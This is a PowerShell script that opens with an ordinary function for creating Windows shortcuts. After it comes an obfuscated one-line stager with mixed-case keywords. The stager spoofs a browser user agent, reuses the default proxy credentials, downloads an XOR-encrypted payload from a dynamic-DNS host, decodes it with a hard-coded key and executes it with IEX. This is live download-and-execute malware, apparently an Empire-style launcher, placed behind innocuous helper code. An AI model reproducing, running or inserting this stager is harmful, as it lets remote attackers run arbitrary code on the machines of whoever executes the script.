















function Create-Shortcut {
    param (
        [string]$Source,
        [string]$DestinationLnk,
        [string]$Arguments
    )

    begin {
        $WshShell = New-Object -ComObject WScript.Shell
    }

    process {
        if (!$Source) {Throw 'No Source'}
        if (!$DestinationLnk) {Throw 'No DestinationLnk'}

        $Shortcut = $WshShell.CreateShortcut($DestinationLnk)
        $Shortcut.TargetPath = $Source
        if ($Arguments) {
            $Shortcut.Arguments = $Arguments
        }
        $Shortcut.Save()
    }

    end {
        function Release-Ref ($ref) {
            ([System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$ref) -gt 0)
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }
        $Shortcut, $WshShell | % {$null = Release-Ref $_}
    }
}

$wC=NEW-ObjECT SyStEm.Net.WebCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEADerS.ADd('User-Agent',$u);$Wc.PRoXY = [SYStEM.NeT.WEBREQUesT]::DefaultWEBProxY;$Wc.PROXY.CrEDentIaLs = [SYsteM.Net.CREdEnTIaLCAChE]::DefaULTNeTWORKCrEdENTiAlS;$K='cb6e63df46ab7a093d805faaf5fda923';$i=0;[CHar[]]$b=([CHAr[]]($Wc.DoWnlOaDStRiNg("http://vanesa.ddns.net:443/index.asp")))|%{$_-bXoR$K[$I++%$K.LENgTh]};IEX ($B-JoIN'')

